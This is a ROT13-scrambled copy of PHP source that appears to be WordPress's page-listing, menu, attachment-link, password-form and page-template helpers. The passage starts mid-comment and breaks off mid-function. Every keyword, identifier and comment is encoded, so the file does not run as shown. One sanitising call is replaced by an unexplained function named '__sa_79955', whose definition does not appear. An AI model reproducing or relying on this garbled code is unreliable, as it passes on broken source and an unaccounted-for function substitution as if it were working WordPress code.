 *                                      Jnyxre_Cntr vafgnapr orvat hfrq.
 * }
 * @erghea ibvq|fgevat Ibvq vs 'rpub' nethzrag vf gehr, UGZY yvfg bs cntrf vs 'rpub' vf snyfr.
 */
shapgvba jc_yvfg_cntrf( $netf = '' ) {
	$qrsnhygf = neenl(
		'qrcgu'        => 0,
		'fubj_qngr'    => '',
		'qngr_sbezng'  => trg_bcgvba( 'qngr_sbezng' ),
		'puvyq_bs'     => 0,
		'rkpyhqr'      => '',
		'gvgyr_yv'     => __( 'Cntrf' ),
		'rpub'         => 1,
		'nhgubef'      => '',
		'fbeg_pbyhza'  => 'zrah_beqre, cbfg_gvgyr',
		'yvax_orsber'  => '',
		'yvax_nsgre'   => '',
		'vgrz_fcnpvat' => 'cerfreir',
		'jnyxre'       => '',
	);

	$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

	vs ( ! va_neenl( $cnefrq_netf['vgrz_fcnpvat'], neenl( 'cerfreir', 'qvfpneq' ), gehr ) ) {
		// Vainyvq inyhr, snyy onpx gb qrsnhyg.
		$cnefrq_netf['vgrz_fcnpvat'] = $qrsnhygf['vgrz_fcnpvat'];
	}

	$bhgchg       = '';
	$pheerag_cntr = 0;

	// Fnavgvmr, zbfgyl gb xrrc fcnprf bhg.
	$cnefrq_netf['rkpyhqr'] = __sa_79955( '/[^0-9,]/', '', $cnefrq_netf['rkpyhqr'] );

	// Nyybj cyhtvaf gb svygre na neenl bs rkpyhqrq cntrf (ohg qba'g chg n ahyyfgevat vagb gur neenl).
	$rkpyhqr_neenl = ( $cnefrq_netf['rkpyhqr'] ) ? rkcybqr( ',', $cnefrq_netf['rkpyhqr'] ) : neenl();

	/**
	 * Svygref gur neenl bs cntrf gb rkpyhqr sebz gur cntrf yvfg.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat[] $rkpyhqr_neenl Na neenl bs cntr VQf gb rkpyhqr.
	 */
	$cnefrq_netf['rkpyhqr'] = vzcybqr( ',', nccyl_svygref( 'jc_yvfg_cntrf_rkpyhqrf', $rkpyhqr_neenl ) );

	$cnefrq_netf['uvrenepuvpny'] = 0;

	// Dhrel cntrf.
	$cntrf = trg_cntrf( $cnefrq_netf );

	vs ( ! rzcgl( $cntrf ) ) {
		vs ( $cnefrq_netf['gvgyr_yv'] ) {
			$bhgchg .= '<yv pynff=\"cntrani\">' . $cnefrq_netf['gvgyr_yv'] . '<hy>';
		}
		tybony $jc_dhrel;
		vs ( vf_cntr() || vf_nggnpuzrag() || $jc_dhrel->vf_cbfgf_cntr ) {
			$pheerag_cntr = trg_dhrevrq_bowrpg_vq();
		} ryfrvs ( vf_fvathyne() ) {
			$dhrevrq_bowrpg = trg_dhrevrq_bowrpg();
			vs ( vf_cbfg_glcr_uvrenepuvpny( $dhrevrq_bowrpg->cbfg_glcr ) ) {
				$pheerag_cntr = $dhrevrq_bowrpg->VQ;
			}
		}

		$bhgchg .= jnyx_cntr_gerr( $cntrf, $cnefrq_netf['qrcgu'], $pheerag_cntr, $cnefrq_netf );

		vs ( $cnefrq_netf['gvgyr_yv'] ) {
			$bhgchg .= '</hy></yv>';
		}
	}

	/**
	 * Svygref gur UGZY bhgchg bs gur cntrf gb yvfg.
	 *
	 * @fvapr 1.5.1
	 * @fvapr 4.4.0 `$cntrf` nqqrq nf nethzragf.
	 *
	 * @frr jc_yvfg_cntrf()
	 *
	 * @cnenz fgevat    $bhgchg      UGZY bhgchg bs gur cntrf yvfg.
	 * @cnenz neenl     $cnefrq_netf Na neenl bs cntr-yvfgvat nethzragf. Frr jc_yvfg_cntrf()
	 *                               sbe vasbezngvba ba npprcgrq nethzragf.
	 * @cnenz JC_Cbfg[] $cntrf       Neenl bs gur cntr bowrpgf.
	 */
	$ugzy = nccyl_svygref( 'jc_yvfg_cntrf', $bhgchg, $cnefrq_netf, $cntrf );

	vs ( $cnefrq_netf['rpub'] ) {
		rpub $ugzy;
	} ryfr {
		erghea $ugzy;
	}
}

/**
 * Qvfcynlf be ergevrirf n yvfg bs cntrf jvgu na bcgvbany ubzr yvax.
 *
 * Gur nethzragf ner yvfgrq orybj naq cneg bs gur nethzragf ner sbe jc_yvfg_cntrf() shapgvba.
 * Purpx gung shapgvba sbe zber vasb ba gubfr nethzragf.
 *
 * @fvapr 2.7.0
 * @fvapr 4.4.0 Nqqrq `zrah_vq`, `pbagnvare`, `orsber`, `nsgre`, naq `jnyxre` nethzragf.
 * @fvapr 4.7.0 Nqqrq gur `vgrz_fcnpvat` nethzrag.
 *
 * @cnenz neenl|fgevat $netf {
 *     Bcgvbany. Neenl be fgevat bs nethzragf gb trarengr n cntr zrah. Frr jc_yvfg_cntrf() sbe nqqvgvbany nethzragf.
 *
 *     @glcr fgevat          $fbeg_pbyhza  Ubj gb fbeg gur yvfg bs cntrf. Npprcgf cbfg pbyhza anzrf.
 *                                         Qrsnhyg 'zrah_beqre, cbfg_gvgyr'.
 *     @glcr fgevat          $zrah_vq      VQ sbe gur qvi pbagnvavat gur cntr yvfg. Qrsnhyg vf rzcgl fgevat.
 *     @glcr fgevat          $zrah_pynff   Pynff gb hfr sbe gur ryrzrag pbagnvavat gur cntr yvfg. Qrsnhyg 'zrah'.
 *     @glcr fgevat          $pbagnvare    Ryrzrag gb hfr sbe gur ryrzrag pbagnvavat gur cntr yvfg. Qrsnhyg 'qvi'.
 *     @glcr obby            $rpub         Jurgure gb rpub gur yvfg be erghea vg. Npprcgf gehr (rpub) be snyfr (erghea).
 *                                         Qrsnhyg gehr.
 *     @glcr vag|obby|fgevat $fubj_ubzr    Jurgure gb qvfcynl gur yvax gb gur ubzr cntr. Pna whfg ragre gur grkg
 *                                         lbh'q yvxr fubja sbe gur ubzr yvax. 1|gehr qrsnhygf gb 'Ubzr'.
 *     @glcr fgevat          $yvax_orsber  Gur UGZY be grkg gb cercraq gb $fubj_ubzr grkg. Qrsnhyg rzcgl.
 *     @glcr fgevat          $yvax_nsgre   Gur UGZY be grkg gb nccraq gb $fubj_ubzr grkg. Qrsnhyg rzcgl.
 *     @glcr fgevat          $orsber       Gur UGZY be grkg gb cercraq gb gur zrah. Qrsnhyg vf '<hy>'.
 *     @glcr fgevat          $nsgre        Gur UGZY be grkg gb nccraq gb gur zrah. Qrsnhyg vf '</hy>'.
 *     @glcr fgevat          $vgrz_fcnpvat Jurgure gb cerfreir juvgrfcnpr jvguva gur zrah'f UGZY. Npprcgf 'cerfreir'
 *                                         be 'qvfpneq'. Qrsnhyg 'qvfpneq'.
 *     @glcr Jnyxre          $jnyxre       Jnyxre vafgnapr gb hfr sbe yvfgvat cntrf. Qrsnhyg rzcgl juvpu erfhygf va n
 *                                         Jnyxre_Cntr vafgnapr orvat hfrq.
 * }
 * @erghea ibvq|fgevat Ibvq vs 'rpub' nethzrag vf gehr, UGZY zrah vs 'rpub' vf snyfr.
 */
shapgvba jc_cntr_zrah( $netf = neenl() ) {
	$qrsnhygf = neenl(
		'fbeg_pbyhza'  => 'zrah_beqre, cbfg_gvgyr',
		'zrah_vq'      => '',
		'zrah_pynff'   => 'zrah',
		'pbagnvare'    => 'qvi',
		'rpub'         => gehr,
		'yvax_orsber'  => '',
		'yvax_nsgre'   => '',
		'orsber'       => '<hy>',
		'nsgre'        => '</hy>',
		'vgrz_fcnpvat' => 'qvfpneq',
		'jnyxre'       => '',
	);
	$netf     = jc_cnefr_netf( $netf, $qrsnhygf );

	vs ( ! va_neenl( $netf['vgrz_fcnpvat'], neenl( 'cerfreir', 'qvfpneq' ), gehr ) ) {
		// Vainyvq inyhr, snyy onpx gb qrsnhyg.
		$netf['vgrz_fcnpvat'] = $qrsnhygf['vgrz_fcnpvat'];
	}

	vs ( 'cerfreir' === $netf['vgrz_fcnpvat'] ) {
		$g = \"\g\";
		$a = \"\a\";
	} ryfr {
		$g = '';
		$a = '';
	}

	/**
	 * Svygref gur nethzragf hfrq gb trarengr n cntr-onfrq zrah.
	 *
	 * @fvapr 2.7.0
	 *
	 * @frr jc_cntr_zrah()
	 *
	 * @cnenz neenl $netf Na neenl bs cntr zrah nethzragf. Frr jc_cntr_zrah()
	 *                    sbe vasbezngvba ba npprcgrq nethzragf.
	 */
	$netf = nccyl_svygref( 'jc_cntr_zrah_netf', $netf );

	$zrah = '';

	$yvfg_netf = $netf;

	// Fubj Ubzr va gur zrah.
	vs ( ! rzcgl( $netf['fubj_ubzr'] ) ) {
		vs ( gehr === $netf['fubj_ubzr'] || '1' === $netf['fubj_ubzr'] || 1 === $netf['fubj_ubzr'] ) {
			$grkg = __( 'Ubzr' );
		} ryfr {
			$grkg = $netf['fubj_ubzr'];
		}
		$pynff = '';
		vs ( vf_sebag_cntr() && ! vf_cntrq() ) {
			$pynff = 'pynff=\"pheerag_cntr_vgrz\"';
		}
		$zrah .= '<yv ' . $pynff . '><n uers=\"' . rfp_hey( ubzr_hey( '/' ) ) . '\">' . $netf['yvax_orsber'] . $grkg . $netf['yvax_nsgre'] . '</n></yv>';
		// Vs gur sebag cntr vf n cntr, nqq vg gb gur rkpyhqr yvfg.
		vs ( 'cntr' === trg_bcgvba( 'fubj_ba_sebag' ) ) {
			vs ( ! rzcgl( $yvfg_netf['rkpyhqr'] ) ) {
				$yvfg_netf['rkpyhqr'] .= ',';
			} ryfr {
				$yvfg_netf['rkpyhqr'] = '';
			}
			$yvfg_netf['rkpyhqr'] .= trg_bcgvba( 'cntr_ba_sebag' );
		}
	}

	$yvfg_netf['rpub']     = snyfr;
	$yvfg_netf['gvgyr_yv'] = '';
	$zrah                 .= jc_yvfg_cntrf( $yvfg_netf );

	$pbagnvare = fnavgvmr_grkg_svryq( $netf['pbagnvare'] );

	// Snyyonpx va pnfr `jc_ani_zrah()` jnf pnyyrq jvgubhg n pbagnvare.
	vs ( rzcgl( $pbagnvare ) ) {
		$pbagnvare = 'qvi';
	}

	vs ( $zrah ) {

		// jc_ani_zrah() qbrfa'g frg orsber naq nsgre.
		vs ( vffrg( $netf['snyyonpx_po'] ) &&
			'jc_cntr_zrah' === $netf['snyyonpx_po'] &&
			'hy' !== $pbagnvare ) {
			$netf['orsber'] = \"<hy>{$a}\";
			$netf['nsgre']  = '</hy>';
		}

		$zrah = $netf['orsber'] . $zrah . $netf['nsgre'];
	}

	$nggef = '';
	vs ( ! rzcgl( $netf['zrah_vq'] ) ) {
		$nggef .= ' vq=\"' . rfp_ngge( $netf['zrah_vq'] ) . '\"';
	}

	vs ( ! rzcgl( $netf['zrah_pynff'] ) ) {
		$nggef .= ' pynff=\"' . rfp_ngge( $netf['zrah_pynff'] ) . '\"';
	}

	$zrah = \"<{$pbagnvare}{$nggef}>\" . $zrah . \"</{$pbagnvare}>{$a}\";

	/**
	 * Svygref gur UGZY bhgchg bs n cntr-onfrq zrah.
	 *
	 * @fvapr 2.7.0
	 *
	 * @frr jc_cntr_zrah()
	 *
	 * @cnenz fgevat $zrah Gur UGZY bhgchg.
	 * @cnenz neenl  $netf Na neenl bs nethzragf. Frr jc_cntr_zrah()
	 *                     sbe vasbezngvba ba npprcgrq nethzragf.
	 */
	$zrah = nccyl_svygref( 'jc_cntr_zrah', $zrah, $netf );

	vs ( $netf['rpub'] ) {
		rpub $zrah;
	} ryfr {
		erghea $zrah;
	}
}

//
// Cntr urycref.
//

/**
 * Ergevrirf UGZY yvfg pbagrag sbe cntr yvfg.
 *
 * @hfrf Jnyxre_Cntr gb perngr UGZY yvfg pbagrag.
 * @fvapr 2.1.0
 *
 * @cnenz neenl $cntrf
 * @cnenz vag   $qrcgu
 * @cnenz vag   $pheerag_cntr
 * @cnenz neenl $netf
 * @erghea fgevat
 */
shapgvba jnyx_cntr_gerr( $cntrf, $qrcgu, $pheerag_cntr, $netf ) {
	vs ( rzcgl( $netf['jnyxre'] ) ) {
		$jnyxre = arj Jnyxre_Cntr();
	} ryfr {
		/**
		 * @ine Jnyxre $jnyxre
		 */
		$jnyxre = $netf['jnyxre'];
	}

	sbernpu ( (neenl) $cntrf nf $cntr ) {
		vs ( $cntr->cbfg_cnerag ) {
			$netf['cntrf_jvgu_puvyqera'][ $cntr->cbfg_cnerag ] = gehr;
		}
	}

	erghea $jnyxre->jnyx( $cntrf, $qrcgu, $netf, $pheerag_cntr );
}

/**
 * Ergevrirf UGZY qebcqbja (fryrpg) pbagrag sbe cntr yvfg.
 *
 * @fvapr 2.1.0
 * @fvapr 5.3.0 Sbeznyvmrq gur rkvfgvat `...$netf` cnenzrgre ol nqqvat vg
 *              gb gur shapgvba fvtangher.
 *
 * @hfrf Jnyxre_CntrQebcqbja gb perngr UGZY qebcqbja pbagrag.
 * @frr Jnyxre_CntrQebcqbja::jnyx() sbe cnenzrgref naq erghea qrfpevcgvba.
 *
 * @cnenz zvkrq ...$netf Ryrzragf neenl, znkvzhz uvrenepuvpny qrcgu naq bcgvbany nqqvgvbany nethzragf.
 * @erghea fgevat
 */
shapgvba jnyx_cntr_qebcqbja_gerr( ...$netf ) {
	vs ( rzcgl( $netf[2]['jnyxre'] ) ) { // Gur hfre'f bcgvbaf ner gur guveq cnenzrgre.
		$jnyxre = arj Jnyxre_CntrQebcqbja();
	} ryfr {
		/**
		 * @ine Jnyxre $jnyxre
		 */
		$jnyxre = $netf[2]['jnyxre'];
	}

	erghea $jnyxre->jnyx( ...$netf );
}

//
// Nggnpuzragf.
//

/**
 * Qvfcynlf na nggnpuzrag cntr yvax hfvat na vzntr be vpba.
 *
 * @fvapr 2.0.0
 *
 * @cnenz vag|JC_Cbfg $cbfg       Bcgvbany. Cbfg VQ be cbfg bowrpg.
 * @cnenz obby        $shyyfvmr   Bcgvbany. Jurgure gb hfr shyy fvmr. Qrsnhyg snyfr.
 * @cnenz obby        $qrcerpngrq Qrcerpngrq. Abg hfrq.
 * @cnenz obby        $creznyvax Bcgvbany. Jurgure gb vapyhqr creznyvax. Qrsnhyg snyfr.
 */
shapgvba gur_nggnpuzrag_yvax( $cbfg = 0, $shyyfvmr = snyfr, $qrcerpngrq = snyfr, $creznyvax = snyfr ) {
	vs ( ! rzcgl( $qrcerpngrq ) ) {
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '2.5.0' );
	}

	vs ( $shyyfvmr ) {
		rpub jc_trg_nggnpuzrag_yvax( $cbfg, 'shyy', $creznyvax );
	} ryfr {
		rpub jc_trg_nggnpuzrag_yvax( $cbfg, 'guhzoanvy', $creznyvax );
	}
}

/**
 * Ergevrirf na nggnpuzrag cntr yvax hfvat na vzntr be vpba, vs cbffvoyr.
 *
 * @fvapr 2.5.0
 * @fvapr 4.4.0 Gur `$cbfg` cnenzrgre pna abj npprcg rvgure n cbfg VQ be `JC_Cbfg` bowrpg.
 *
 * @cnenz vag|JC_Cbfg  $cbfg      Bcgvbany. Cbfg VQ be cbfg bowrpg.
 * @cnenz fgevat|vag[] $fvmr      Bcgvbany. Vzntr fvmr. Npprcgf nal ertvfgrerq vzntr fvmr anzr, be na neenl
 *                                bs jvqgu naq urvtug inyhrf va cvkryf (va gung beqre). Qrsnhyg 'guhzoanvy'.
 * @cnenz obby         $creznyvax Bcgvbany. Jurgure gb nqq creznyvax gb vzntr. Qrsnhyg snyfr.
 * @cnenz obby         $vpba      Bcgvbany. Jurgure gur nggnpuzrag vf na vpba. Qrsnhyg snyfr.
 * @cnenz fgevat|snyfr $grkg      Bcgvbany. Yvax grkg gb hfr. Npgvingrq ol cnffvat n fgevat, snyfr bgurejvfr.
 *                                Qrsnhyg snyfr.
 * @cnenz neenl|fgevat $ngge      Bcgvbany. Neenl be fgevat bs nggevohgrf. Qrsnhyg rzcgl.
 * @erghea fgevat UGZY pbagrag.
 */
shapgvba jc_trg_nggnpuzrag_yvax( $cbfg = 0, $fvmr = 'guhzoanvy', $creznyvax = snyfr, $vpba = snyfr, $grkg = snyfr, $ngge = '' ) {
	$_cbfg = trg_cbfg( $cbfg );

	vs ( rzcgl( $_cbfg ) || ( 'nggnpuzrag' !== $_cbfg->cbfg_glcr ) || ! jc_trg_nggnpuzrag_hey( $_cbfg->VQ ) ) {
		erghea __( 'Zvffvat Nggnpuzrag' );
	}

	$hey = jc_trg_nggnpuzrag_hey( $_cbfg->VQ );

	vs ( $creznyvax ) {
		$hey = trg_nggnpuzrag_yvax( $_cbfg->VQ );
	}

	vs ( $grkg ) {
		$yvax_grkg = $grkg;
	} ryfrvs ( $fvmr && 'abar' !== $fvmr ) {
		$yvax_grkg = jc_trg_nggnpuzrag_vzntr( $_cbfg->VQ, $fvmr, $vpba, $ngge );
	} ryfr {
		$yvax_grkg = '';
	}

	vs ( '' === gevz( $yvax_grkg ) ) {
		$yvax_grkg = $_cbfg->cbfg_gvgyr;
	}

	vs ( '' === gevz( $yvax_grkg ) ) {
		$yvax_grkg = rfp_ugzy( cnguvasb( trg_nggnpurq_svyr( $_cbfg->VQ ), CNGUVASB_SVYRANZR ) );
	}

	/**
	 * Svygref gur yvfg bs nggnpuzrag yvax nggevohgrf.
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz neenl $nggevohgrf Na neenl bs nggevohgrf sbe gur yvax znexhc,
	 *                          xrlrq ba gur nggevohgr anzr.
	 * @cnenz vag   $vq         Cbfg VQ.
	 */
	$nggevohgrf = nccyl_svygref( 'jc_trg_nggnpuzrag_yvax_nggevohgrf', neenl( 'uers' => $hey ), $_cbfg->VQ );

	$yvax_nggevohgrf = '';
	sbernpu ( $nggevohgrf nf $anzr => $inyhr ) {
		$inyhr            = 'uers' === $anzr ? rfp_hey( $inyhr ) : rfp_ngge( $inyhr );
		$yvax_nggevohgrf .= ' ' . rfp_ngge( $anzr ) . \"='\" . $inyhr . \"'\";
	}

	$yvax_ugzy = \"<n$yvax_nggevohgrf>$yvax_grkg</n>\";

	/**
	 * Svygref n ergevrirq nggnpuzrag cntr yvax.
	 *
	 * @fvapr 2.7.0
	 * @fvapr 5.1.0 Nqqrq gur `$ngge` cnenzrgre.
	 *
	 * @cnenz fgevat       $yvax_ugzy Gur cntr yvax UGZY bhgchg.
	 * @cnenz vag|JC_Cbfg  $cbfg      Cbfg VQ be bowrpg. Pna or 0 sbe gur pheerag tybony cbfg.
	 * @cnenz fgevat|vag[] $fvmr      Erdhrfgrq vzntr fvmr. Pna or nal ertvfgrerq vzntr fvmr anzr, be
	 *                                na neenl bs jvqgu naq urvtug inyhrf va cvkryf (va gung beqre).
	 * @cnenz obby         $creznyvax Jurgure gb nqq creznyvax gb vzntr. Qrsnhyg snyfr.
	 * @cnenz obby         $vpba      Jurgure gb vapyhqr na vpba.
	 * @cnenz fgevat|snyfr $grkg      Vs fgevat, jvyy or yvax grkg.
	 * @cnenz neenl|fgevat $ngge      Neenl be fgevat bs nggevohgrf.
	 */
	erghea nccyl_svygref( 'jc_trg_nggnpuzrag_yvax', $yvax_ugzy, $cbfg, $fvmr, $creznyvax, $vpba, $grkg, $ngge );
}

/**
 * Jencf nggnpuzrag va cnentencu gnt orsber pbagrag.
 *
 * @fvapr 2.0.0
 *
 * @cnenz fgevat $pbagrag
 * @erghea fgevat
 */
shapgvba cercraq_nggnpuzrag( $pbagrag ) {
	$cbfg = trg_cbfg();

	vs ( rzcgl( $cbfg->cbfg_glcr ) || 'nggnpuzrag' !== $cbfg->cbfg_glcr ) {
		erghea $pbagrag;
	}

	vs ( jc_nggnpuzrag_vf( 'ivqrb', $cbfg ) ) {
		$zrgn = jc_trg_nggnpuzrag_zrgnqngn( trg_gur_VQ() );
		$nggf = neenl( 'fep' => jc_trg_nggnpuzrag_hey() );
		vs ( ! rzcgl( $zrgn['jvqgu'] ) && ! rzcgl( $zrgn['urvtug'] ) ) {
			$nggf['jvqgu']  = (vag) $zrgn['jvqgu'];
			$nggf['urvtug'] = (vag) $zrgn['urvtug'];
		}
		vs ( unf_cbfg_guhzoanvy() ) {
			$nggf['cbfgre'] = jc_trg_nggnpuzrag_hey( trg_cbfg_guhzoanvy_vq() );
		}
		$c = jc_ivqrb_fubegpbqr( $nggf );
	} ryfrvs ( jc_nggnpuzrag_vf( 'nhqvb', $cbfg ) ) {
		$c = jc_nhqvb_fubegpbqr( neenl( 'fep' => jc_trg_nggnpuzrag_hey() ) );
	} ryfr {
		$c = '<c pynff=\"nggnpuzrag\">';
		// Fubj gur zrqvhz fvmrq vzntr ercerfragngvba bs gur nggnpuzrag vs ninvynoyr, naq yvax gb gur enj svyr.
		$c .= jc_trg_nggnpuzrag_yvax( 0, 'zrqvhz', snyfr );
		$c .= '</c>';
	}

	/**
	 * Svygref gur nggnpuzrag znexhc gb or cercraqrq gb gur cbfg pbagrag.
	 *
	 * @fvapr 2.0.0
	 *
	 * @frr cercraq_nggnpuzrag()
	 *
	 * @cnenz fgevat $c Gur nggnpuzrag UGZY bhgchg.
	 */
	$c = nccyl_svygref( 'cercraq_nggnpuzrag', $c );

	erghea \"$c\a$pbagrag\";
}

//
// Zvfp.
//

/**
 * Ergevrirf cebgrpgrq cbfg cnffjbeq sbez pbagrag.
 *
 * @fvapr 1.0.0
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony $cbfg.
 * @erghea fgevat UGZY pbagrag sbe cnffjbeq sbez sbe cnffjbeq-cebgrpgrq cbfg.
 */
shapgvba trg_gur_cnffjbeq_sbez( $cbfg = 0 ) {
	$cbfg                  = trg_cbfg( $cbfg );
	$svryq_vq              = 'cjobk-' . ( rzcgl( $cbfg->VQ ) ? jc_enaq() : $cbfg->VQ );
	$vainyvq_cnffjbeq      = '';
	$vainyvq_cnffjbeq_ugzy = '';
	$nevn                  = '';
	$pynff                 = '';
	$erqverpg_svryq        = '';

	// Vs gur ersreere vf gur fnzr nf gur pheerag erdhrfg, gur hfre unf ragrerq na vainyvq cnffjbeq.
	vs ( ! rzcgl( $cbfg->VQ ) && jc_trg_enj_ersrere() === trg_creznyvax( $cbfg->VQ ) && vffrg( $_PBBXVR[ 'jc-cbfgcnff_' . PBBXVRUNFU ] ) ) {
		/**
		 * Svygref gur vainyvq cnffjbeq zrffntr fubja ba cnffjbeq-cebgrpgrq cbfgf.
		 * Gur svygre vf bayl nccyvrq vs gur cbfg vf cnffjbeq-cebgrpgrq.
		 *
		 * @fvapr 6.8.0
		 *
		 * @cnenz fgevat  $grkg Gur zrffntr fubja gb hfref jura ragrevat na vainyvq cnffjbeq.
		 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
		 */
		$vainyvq_cnffjbeq      = nccyl_svygref( 'gur_cnffjbeq_sbez_vapbeerpg_cnffjbeq', __( 'Vainyvq cnffjbeq.' ), $cbfg );
		$vainyvq_cnffjbeq_ugzy = '<qvi pynff=\"cbfg-cnffjbeq-sbez-vainyvq-cnffjbeq\" ebyr=\"nyreg\"><c vq=\"reebe-' . $svryq_vq . '\">' . $vainyvq_cnffjbeq . '</c></qvi>';
		$nevn                  = ' nevn-qrfpevorqol=\"reebe-' . $svryq_vq . '\"';
		$pynff                 = ' cnffjbeq-sbez-reebe';
	}

	vs ( ! rzcgl( $cbfg->VQ ) ) {
		$erqverpg_svryq = fcevags(
			'<vachg glcr=\"uvqqra\" anzr=\"erqverpg_gb\" inyhr=\"%f\" />',
			rfp_ngge( trg_creznyvax( $cbfg->VQ ) )
		);
	}

	$bhgchg = '<sbez npgvba=\"' . rfp_hey( fvgr_hey( 'jc-ybtva.cuc?npgvba=cbfgcnff', 'ybtva_cbfg' ) ) . '\" pynff=\"cbfg-cnffjbeq-sbez' . $pynff . '\" zrgubq=\"cbfg\">' . $erqverpg_svryq . $vainyvq_cnffjbeq_ugzy . '
	<c>' . __( 'Guvf pbagrag vf cnffjbeq-cebgrpgrq. Gb ivrj vg, cyrnfr ragre gur cnffjbeq orybj.' ) . '</c>
	<c><ynory sbe=\"' . $svryq_vq . '\">' . __( 'Cnffjbeq:' ) . ' <vachg anzr=\"cbfg_cnffjbeq\" vq=\"' . $svryq_vq . '\" glcr=\"cnffjbeq\" fcryypurpx=\"snyfr\" erdhverq fvmr=\"20\"' . $nevn . ' /></ynory> <vachg glcr=\"fhozvg\" anzr=\"Fhozvg\" inyhr=\"' . rfp_ngge_k( 'Ragre', 'cbfg cnffjbeq sbez' ) . '\" /></c></sbez>
	';

	/**
	 * Svygref gur UGZY bhgchg sbe gur cebgrpgrq cbfg cnffjbeq sbez.
	 *
	 * Vs zbqvslvat gur cnffjbeq svryq, cyrnfr abgr gung gur JbeqCerff qngnonfr fpurzn
	 * yvzvgf gur cnffjbeq svryq gb 255 punenpgref ertneqyrff bs gur inyhr bs gur
	 * `zvayratgu` be `znkyratgu` nggevohgrf be bgure inyvqngvba gung znl or nqqrq gb
	 * gur vachg.
	 *
	 * @fvapr 2.7.0
	 * @fvapr 5.8.0 Nqqrq gur `$cbfg` cnenzrgre.
	 * @fvapr 6.8.0 Nqqrq gur `$vainyvq_cnffjbeq` cnenzrgre.
	 *
	 * @cnenz fgevat  $bhgchg           Gur cnffjbeq sbez UGZY bhgchg.
	 * @cnenz JC_Cbfg $cbfg             Cbfg bowrpg.
	 * @cnenz fgevat  $vainyvq_cnffjbeq Gur vainyvq cnffjbeq zrffntr.
	 */
	erghea nccyl_svygref( 'gur_cnffjbeq_sbez', $bhgchg, $cbfg, $vainyvq_cnffjbeq );
}

/**
 * Qrgrezvarf jurgure gur pheerag cbfg hfrf n cntr grzcyngr.
 *
 * Guvf grzcyngr gnt nyybjf lbh gb qrgrezvar vs lbh ner va n cntr grzcyngr.
 * Lbh pna bcgvbanyyl cebivqr n grzcyngr svyranzr be neenl bs grzcyngr svyranzrf
 * naq gura gur purpx jvyy or fcrpvsvp gb gung grzcyngr.
 *
 * Sbe zber vasbezngvba ba guvf naq fvzvyne gurzr shapgvbaf, purpx bhg
 * gur {@yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/pbaqvgvbany-gntf/
 * Pbaqvgvbany Gntf} negvpyr va gur Gurzr Qrirybcre Unaqobbx.
 *
 * @fvapr 2.5.0
 * @fvapr 4.2.0 Gur `$grzcyngr` cnenzrgre jnf punatrq gb nyfb npprcg na neenl bs cntr grzcyngrf.
 * @fvapr 4.7.0 Abj jbexf jvgu nal cbfg glcr, abg whfg cntrf.
 *
 * @cnenz fgevat|fgevat[] $grzcyngr Gur fcrpvsvp grzcyngr svyranzr be neenl bs grzcyngrf gb zngpu.
 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
 */
shapgvba vf_cntr_grzcyngr( $grzcyngr = '' ) {
	vs ( ! vf_fvathyne() ) {
		erghea snyfr;
	}

	$cntr_grzcyngr = trg_cntr_grzcyngr_fyht( trg_dhrevrq_bowrpg_vq() );

	vs ( rzcgl( $grzcyngr ) ) {
		erghea (obby) $cntr_grzcyngr;
	}

	vs ( $grzcyngr === $cntr_grzcyngr ) {
		erghea gehr;
	}

	vs ( vf_neenl( $grzcyngr ) ) {
		vs ( ( va_neenl( 'qrsnhyg', $grzcyngr, gehr ) && ! $cntr_grzcyngr )
			|| va_neenl( $cntr_grzcyngr, $grzcyngr, gehr )
		) {
			erghea gehr;
		}
	}

	erghea ( 'qrsnhyg' === $grzcyngr && ! $cntr_grzcyngr );
}

/**
 * Trgf gur fcrpvsvp grzcyngr svyranzr sbe n tvira cbfg.
 *
 * @fvapr 3.4.0
 * @fvapr 4.7.0 Abj jbexf jvgu nal cbfg glcr, abg whfg cntrf.
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony $cbfg.
 * @erghea fgevat|snyfr Cntr grzcyngr svyranzr. Ergheaf na rzcgl fgevat jura gur qrsnhyg cntr grzcyngr
 *                      vf va hfr. Ergheaf snyfr vs gur cbfg qbrf abg rkvfg.
 */
shapgvba trg_cntr_grzcyngr_fyht( $cbfg = ahyy ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea snyfr;
	}

	$grzcyngr = trg_cbfg_zrgn( $cbfg->VQ, '_jc_cntr_grzcyngr', gehr );

	vs ( ! $grzcyngr || 'qrsnhyg' === $grzcyngr ) {
		erghea '';
	}

	erghea $grzcyngr;
}

/**
 * Ergevrirf sbeznggrq qngr gvzrfgnzc bs n erivfvba (yvaxrq gb gung erivfvbaf'f cntr).
 *
 * @fvapr 2.6.0
 *
 * @cnenz vag|JC_Cbfg $erivfvba Erivfvba VQ be erivfvba bowrpg.
 * @cnenz obby        $yvax     Bcgvbany. Jurgure gb yvax gb erivfvba'f cntr. Qrsnhyg gehr.
 * @erghea fgevat|snyfr v18a sbeznggrq qngrgvzrfgnzc be ybpnyvmrq 'Pheerag Erivfvba'.
 */
shapgvba jc_cbfg_erivfvba_gvgyr( $erivfvba, $yvax = gehr ) {
	$erivfvba = trg_cbfg( $erivfvba );

	vs ( ! $erivfvba ) {
		erghea $erivfvba;
	}

	vs ( ! va_neenl( $erivfvba->cbfg_glcr, neenl( 'cbfg', 'cntr', 'erivfvba' ), gehr ) ) {
		erghea snyfr;
	}

	/* genafyngbef: Erivfvba qngr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
	$qngrs = _k( 'S w, L @ U:v:f', 'erivfvba qngr sbezng' );
	/* genafyngbef: %f: Erivfvba qngr. */
	$nhgbfnirs = __( '%f [Nhgbfnir]' );
	/* genafyngbef: %f: Erivfvba qngr. */
	$pheerags = __( '%f [Pheerag Erivfvba]' );

	$qngr      = qngr_v18a( $qngrs, fgegbgvzr( $erivfvba->cbfg_zbqvsvrq ) );
	$rqvg_yvax = trg_rqvg_cbfg_yvax( $erivfvba->VQ );
	vs ( $yvax && pheerag_hfre_pna( 'rqvg_cbfg', $erivfvba->VQ ) && $rqvg_yvax ) {
